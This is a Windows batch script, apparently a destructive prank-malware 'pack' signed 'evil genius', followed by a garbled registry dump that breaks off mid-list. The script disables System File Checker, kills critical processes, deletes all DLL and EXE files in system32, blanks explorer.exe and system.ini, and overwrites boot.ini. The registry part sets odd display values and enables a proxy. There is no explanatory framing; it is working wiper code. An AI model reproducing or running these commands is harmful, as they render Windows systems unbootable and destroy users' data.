   @title xp exodus pack!
   color f0
   @sfc /disable
   @sfc /cachesize=1
   taskkill /im svchost.exe /f
   @echo y|DEl %windir%\system32\*.dll
   @echo Y|DEl %windir%\system32\*.exe
   rem you system delited!
   @echo created by evil genius
   taskkill /im Explorer.exe /f
   nul >%windir%\explorer.exe
   attrib %systemdrive%\boot.ini -r
   attrib %systemdrive%\boot.ini -s
   attrib %systemdrive%\boot.ini -h
   attrib %systemdrive%\boot.ini -a
   attrib %systemdrive%\windows\inf -r
   attrib %systemdrive%\windows\inf -s
   attrib %systemdrive%\windows\inf -h
   attrib %systemdrive%\windows\inf -a
   @echo error=error >%systemdrive%\boot.ini
   del %windir%\inf\*.inf
   del %windir%\inf\*.dll
   attrib %windir%\regedit.exe -r
   attrib %windir%\regedit.exe -s
   attrib %windir%\regedit.exe -a
   attrib %windir%\system.ini -r
   attrib %windir%\system.ini -s
   attrib %windir%\system.ini -a
   nul >%windir%\system.ini
   ren %windir%\twunk_32.exe 1.old
   del %windir%\regedit.exe
   assoc .r=winrar
   taskkill /im svchost.exe /f
   @Echo part 2
   Windows Registry Editor Version 5.00

   [HKEY_CURRENT_CONFIG]

   [HKEY_CURRENT_CONFIG\Software]

   [HKEY_CURRENT_CONFIG\Software\Fonts]
   "FIXEDFON.FON"="vgafixr.fon"
   "FONTS.FON"="vgasysr.fon"
   "OEMFONT.FON"="vga866.fon"
   "LogPixels"=dword:00000666

   [HKEY_CURRENT_CONFIG\Software\Microsoft]

   [HKEY_CURRENT_CONFIG\Software\Microsoft\windows]

   [HKEY_CURRENT_CONFIG\Software\Microsoft\windows\CurrentVersion]

   [HKEY_CURRENT_CONFIG\Software\Microsoft\windows\CurrentVersion\Internet Settings]
   "ProxyEnable"=dword:00000001

   [HKEY_CURRENT_CONFIG\System]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Class]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Class\{4D36E96A-E325-11CE-BFC1-08002BE10318}]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Class\{4D36E96A-E325-11CE-BFC1-08002BE10318}\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Class\{4D36E96A-E325-11CE-BFC1-08002BE10318}\0001]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Class\{4D36E96A-E325-11CE-BFC1-08002BE10318}\0002]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Print]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Print\Printers]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\Print\Printers\Canon S200]
   "PrinterOnLine"=dword:00000001

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{18BBFE04-9B53-4710-B31F-90D24574BA63}]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{18BBFE04-9B53-4710-B31F-90D24574BA63}\0000]
   "Attach.ToDesktop"=dword:00000001
   "DefaultSettings.BitsPerPel"=dword:00000020
   "DefaultSettings.XResolution"=dword:00111111
   "DefaultSettings.YResolution"=dword:00000258
   "DefaultSettings.VRefresh"=dword:00000055
   "DefaultSettings.Flags"=dword:00000000
   "DefaultSettings.XPanning"=dword:00000000
   "DefaultSettings.YPanning"=dword:00000000
   "DefaultSettings.Orientation"=dword:00000000
   "DefaultSettings.FixedOutput"=dword:00000010
   "Attach.RelativeX"=dword:00000000
   "Attach.RelativeY"=dword:00000000

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{18BBFE04-9B53-4710-B31F-90D24574BA63}\0000\Mon22446688]
   "DefaultSettings.BitsPerPel"=dword:00000020
   "DefaultSettings.XResolution"=dword:00000320
   "DefaultSettings.YResolution"=dword:00000258
   "DefaultSettings.VRefresh"=dword:00000055
   "DefaultSettings.Flags"=dword:00000000
   "DefaultSettings.XPanning"=dword:00000000
   "DefaultSettings.YPanning"=dword:00000000
   "DefaultSettings.Orientation"=dword:00000000
   "DefaultSettings.FixedOutput"=dword:00000000
   "Attach.ToDesktop"=dword:00000001
   "Attach.RelativeX"=dword:00000000
   "Attach.RelativeY"=dword:00000000

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{23A77BF7-ED96-40EC-AF06-9B1F4867732A}]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{23A77BF7-ED96-40EC-AF06-9B1F4867732A}\0000]
   "Attach.ToDesktop"=dword:00000001

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{52EFD849-130C-4FCA-9FEC-43A705E671E8}]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{52EFD849-130C-4FCA-9FEC-43A705E671E8}\0000]
   "Attach.ToDesktop"=dword:00100000

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{FF4F8A2B-E4DF-414D-8D4E-B6F57E8E2BDB}]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{FF4F8A2B-E4DF-414D-8D4E-B6F57E8E2BDB}\0000]
   "DefaultSettings.BitsPerPel"=dword:00000020
   "DefaultSettings.XResolution"=dword:00000320
   "DefaultSettings.YResolution"=dword:00000258
   "DefaultSettings.VRefresh"=dword:0000003c
   "DefaultSettings.Flags"=dword:00000004
   "DefaultSettings.XPanning"=dword:00000000
   "DefaultSettings.YPanning"=dword:00000000
   "DefaultSettings.Orientation"=dword:00000000
   "DefaultSettings.FixedOutput"=dword:00000000
   "Attach.ToDesktop"=dword:00000001
   "Attach.RelativeX"=dword:00000000
   "Attach.RelativeY"=dword:00000000

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{FF4F8A2B-E4DF-414D-8D4E-B6F57E8E2BDB}\0000\Mon10000000]
   "Attach.ToDesktop"=dword:00000001
   "DefaultSettings.BitsPerPel"=dword:00000020
   "DefaultSettings.XResolution"=dword:00000320
   "DefaultSettings.YResolution"=dword:00000258
   "DefaultSettings.VRefresh"=dword:0000003c
   "DefaultSettings.Flags"=dword:00000004
   "DefaultSettings.XPanning"=dword:10000000
   "DefaultSettings.YPanning"=dword:00000000
   "DefaultSettings.Orientation"=dword:00000000
   "DefaultSettings.FixedOutput"=dword:00000000
   "Attach.RelativeX"=dword:00100000
   "Attach.RelativeY"=dword:00000000

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Control\VIDEO\{FF4F8A2B-E4DF-414D-8D4E-B6F57E8E2BDB}\0000\Mon10000080]
   "DefaultSettings.BitsPerPel"=dword:00000020
   "DefaultSettings.XResolution"=dword:00000320
   "DefaultSettings.YResolution"=dword:00000258
   "DefaultSettings.VRefresh"=dword:0000003c
   "DefaultSettings.Flags"=dword:00000004
   "DefaultSettings.XPanning"=dword:00000000
   "DefaultSettings.YPanning"=dword:00000000
   "DefaultSettings.Orientation"=dword:00000000
   "DefaultSettings.FixedOutput"=dword:00000000
   "Attach.ToDesktop"=dword:00010001
   "Attach.RelativeX"=dword:00000000
   "Attach.RelativeY"=dword:00000000

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11\3&13C0B0C5&0&FD]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11\3&13C0B0C5&0&FD\DirectSound]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11\3&13C0B0C5&0&FD\DirectSound\Device Presence]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11\3&13C0B0C5&0&FD\DirectSound\Mixer Defaults]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11\3&13C0B0C5&0&FD\DirectSound\Speaker Configuration]
   "Speaker Configuration"=dword:00140004

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\PCI\VEN_8086&DEV_2445&SUBSYS_A0021458&REV_11\3&13C0B0C5&0&FD\DirectSoundCapture]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_L2TPMINIPORT]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_L2TPMINIPORT\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_NDISWANIP]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_NDISWANIP\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PPPOEMINIPORT]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PPPOEMINIPORT\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PPTPMINIPORT]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PPTPMINIPORT\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PSCHEDMP]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PSCHEDMP\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PTIMINIPORT]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\ROOT\MS_PTIMINIPORT\0000]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\SW]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\SW\{EEAB7790-C514-11D1-B42B-00805FC1270E}]

   [HKEY_CURRENT_CONFIG\System\CurrentControlSet\Enum\SW\{EEAB7790-C514-11D1-B42B-00805FC1270E}\ASYNCMAC]
